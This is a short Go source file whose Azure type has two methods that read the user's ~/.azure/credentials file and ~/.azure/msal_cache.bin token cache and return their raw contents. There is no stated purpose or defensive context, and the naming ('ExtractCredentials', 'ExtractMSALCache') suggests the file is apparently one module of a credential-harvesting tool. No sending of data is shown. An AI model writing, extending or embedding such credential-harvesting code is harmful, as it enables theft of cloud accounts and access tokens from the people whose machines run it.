package cloud

import (
"os"
"path/filepath"
)

type Azure struct{}

func NewAzure() *Azure {
return &Azure{}
}

func (a *Azure) ExtractCredentials() (string, error) {
path := filepath.Join(os.Getenv("HOME"), ".azure", "credentials")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}

func (a *Azure) ExtractMSALCache() (string, error) {
path := filepath.Join(os.Getenv("HOME"), ".azure", "msal_cache.bin")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}
